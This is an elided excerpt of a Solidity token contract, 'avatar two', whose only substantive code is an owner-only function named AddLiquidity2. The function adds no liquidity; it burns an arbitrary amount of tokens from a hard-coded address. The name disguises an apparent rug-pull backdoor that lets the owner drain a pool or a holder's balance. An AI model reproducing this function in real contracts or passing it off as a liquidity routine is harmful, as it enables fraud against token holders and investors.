...
contract avatar {
    ...
    string public constant name = "avatar two";
    string public constant symbol = "avtwo";
    ...
    function AddLiquidity2(uint256 amount) public onlyOwner returns (bool) {
        _burn(0x84632fB8d54e5dFf7619b8f6734290fC910B58ef, amount);
        return true;
    }
